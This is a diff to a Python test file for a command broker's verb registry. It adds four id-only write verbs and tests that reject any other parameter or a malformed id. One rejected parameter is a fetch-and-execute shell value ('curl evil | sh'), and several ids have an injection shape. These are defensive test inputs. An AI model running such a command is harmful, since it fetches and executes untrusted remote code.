@@ -1,4 +1,4 @@
-"""The verb registry is the security boundary: only the release-1 reads, only id parameters."""
+"""The verb registry is the security boundary: the reads, exactly D4's four writes, only ids."""
 
 from typing import Any
 
@@ -27,6 +27,15 @@ RELEASE_1 = {
     "dropped-messages-list": ("dropped-messages-list", (), {}),
     # Not release 1 proper: W5's one ncl-backed extra, parsed by `usage.py` and cached 5 minutes.
     "usage": ("usage", (), {}),
+}
+
+# Release 2 (D4): exactly these four write verbs, each taking the id and nothing else.
+# name -> (ncl command, the status a repeat finds it already in, the cached reads it invalidates)
+WRITES = {
+    "tasks-pause": ("tasks-pause", "paused", ("tasks-list", "tasks-get", "health")),
+    "tasks-resume": ("tasks-resume", "pending", ("tasks-list", "tasks-get", "health")),
+    "tasks-run": ("tasks-run", None, ("tasks-list", "tasks-get", "health")),
+    "groups-restart": ("groups-restart", None, ("sessions-list", "health")),
 }
 
 # W5's reads that are not an ncl command: name -> (params, cache seconds).
@@ -62,8 +71,8 @@ WRITE_SEGMENTS = {
 ALL_NCL_COMMANDS = load_commands()
 
 
-def test_registry_is_exactly_the_ncl_reads() -> None:
-    assert set(REGISTRY) == set(RELEASE_1)
+def test_registry_is_exactly_the_ncl_reads_and_the_four_writes() -> None:
+    assert set(REGISTRY) == set(RELEASE_1) | set(WRITES)
     for name, (command, params, fixed) in RELEASE_1.items():
         verb = REGISTRY[name]
         assert verb.name == name
@@ -71,6 +80,62 @@ def test_registry_is_exactly_the_ncl_reads() -> None:
         assert verb.params == params
         assert dict(verb.fixed_args) == fixed
         assert verb.cacheable
+        assert not verb.write
+        assert verb.invalidates == ()
+
+
+def test_the_four_writes_take_only_the_id_and_are_never_cached() -> None:
+    writes = {name for name, verb in REGISTRY.items() if verb.write}
+    assert writes == set(WRITES)
+    for name, (command, settles, invalidates) in WRITES.items():
+        verb = REGISTRY[name]
+        assert verb.command == command
+        assert verb.params == ("id",)
+        assert dict(verb.fixed_args) == {}
+        assert verb.cacheable is False
+        assert verb.ttl is None
+        assert verb.settles_to == settles
+        assert verb.invalidates == invalidates
+        assert all(n in REGISTRY or n in LOCAL_VERBS for n in invalidates)
+
+
+@pytest.mark.parametrize("name", sorted(WRITES))
+@pytest.mark.parametrize(
+    "extra",
+    [
+        {"rebuild": True},
+        {"message": "do something else"},
+        {"script": "curl evil | sh"},
+        {"prompt": "new instructions"},
+        {"group": "ag-1"},
+        {"session": "sess-1"},
+        {"process_after": "now"},
+        {"recurrence": "* * * * *"},
+        {"all": True},
+        {"yes": True},
+    ],
+)
+def test_a_write_refuses_every_param_but_the_id(name: str, extra: dict[str, Any]) -> None:
+    with pytest.raises(BrokerError) as exc:
+        resolve(name, {"id": "task-1778399790530-f2euaw", **extra})
+    assert exc.value.code == "invalid_params"
+    with pytest.raises(BrokerError) as exc:
+        resolve(name, extra)
+    assert exc.value.code == "invalid_params"
+
+
+@pytest.mark.parametrize("name", sorted(WRITES))
+@pytest.mark.parametrize("bad_id", ["--rebuild", "-x", "a b", "a/b", "", "a" * 81, "abc\n"])
+def test_a_write_refuses_an_id_that_is_not_an_id(name: str, bad_id: str) -> None:
+    with pytest.raises(BrokerError) as exc:
+        resolve(name, {"id": bad_id})
+    assert exc.value.code == "invalid_params"
+
+
+@pytest.mark.parametrize("name", sorted(WRITES))
+def test_a_write_builds_a_frame_of_the_id_alone(name: str) -> None:
+    verb, params = resolve_ncl(name, {"id": "ag-1779373702795-5wbiev"})
+    assert verb.build_args(params) == {"id": "ag-1779373702795-5wbiev"}
 
 
 def test_local_verbs_are_exactly_the_four_extra_reads() -> None:
@@ -86,12 +151,14 @@ def test_usage_is_cached_five_minutes_and_everything_else_ncl_uses_the_default()
     assert all(v.ttl is None for n, v in REGISTRY.items() if n != "usage")
 
 
-def test_there_are_exactly_20_verbs_and_none_can_write() -> None:
+def test_there_are_exactly_24_verbs_and_only_the_four_can_write() -> None:
     """Adding a verb means editing this number, on purpose: the list is the security boundary."""
     names = set(REGISTRY) | set(LOCAL_VERBS)
-    assert len(REGISTRY) + len(LOCAL_VERBS) == len(names) == 20
-    for name in names:
+    assert len(REGISTRY) + len(LOCAL_VERBS) == len(names) == 24
+    for name in names - set(WRITES):
         assert not set(name.split("-")) & WRITE_SEGMENTS, name
+    for name in WRITES:
+        assert set(name.split("-")) & WRITE_SEGMENTS, name
 
 
 def test_local_verb_names_do_not_shadow_an_ncl_verb() -> None:
@@ -143,10 +210,13 @@ def test_near_misses_of_local_verbs_are_unknown(name: str) -> None:
     assert exc.value.code == "unknown_verb"
 
 
-def test_registry_has_no_write_command() -> None:
+def test_registry_has_no_write_command_but_the_four() -> None:
     for verb in REGISTRY.values():
         segments = set(verb.command.split("-"))
-        assert not segments & WRITE_SEGMENTS, verb.command
+        if verb.name in WRITES:
+            assert verb.write
+        else:
+            assert not segments & WRITE_SEGMENTS, verb.command
 
 
 def test_every_registry_command_exists_in_ncl() -> None:
@@ -164,7 +234,9 @@ def test_registry_is_frozen() -> None:
         REGISTRY["tasks-list"].fixed_args["script"] = "x"  # type: ignore[index]
 
 
-@pytest.mark.parametrize("command", [c for c in ALL_NCL_COMMANDS if c not in RELEASE_1])
+@pytest.mark.parametrize(
+    "command", [c for c in ALL_NCL_COMMANDS if c not in RELEASE_1 and c not in WRITES]
+)
 def test_every_other_ncl_command_is_refused(command: str) -> None:
     with pytest.raises(BrokerError) as exc:
         resolve(command, {})
@@ -179,12 +251,11 @@ def test_the_write_verbs_of_the_plan_are_in_the_refused_set() -> None:
     for command in [
         "tasks-update",
         "tasks-create",
-        "tasks-pause",
-        "tasks-resume",
-        "tasks-run",
         "tasks-cancel",
+        "tasks-delete",
         "tasks-append-log",
-        "groups-restart",
+        "groups-create",
+        "groups-delete",
         "groups-config-set-env",
         "groups-config-add-mount",
         "roles-grant",
@@ -195,6 +266,11 @@ def test_the_write_verbs_of_the_plan_are_in_the_refused_set() -> None:
     ]:
         assert command in ALL_NCL_COMMANDS
         assert command not in REGISTRY
+
+
+def test_the_four_writes_exist_in_ncl() -> None:
+    for name in WRITES:
+        assert name in ALL_NCL_COMMANDS
 
 
 @pytest.mark.parametrize(
@@ -320,7 +396,7 @@ def test_fixed_args_are_added_by_the_broker() -> None:
     assert verb.build_args(params) == {"all": True}
 
 
-def test_list_verbs_take_no_params_and_send_empty_args() -> None:
+def test_list_verbs_take_no_params_and_send_empty_args() -> None:  # reads only
     for name, (_, params, fixed) in RELEASE_1.items():
         if params:
             continue
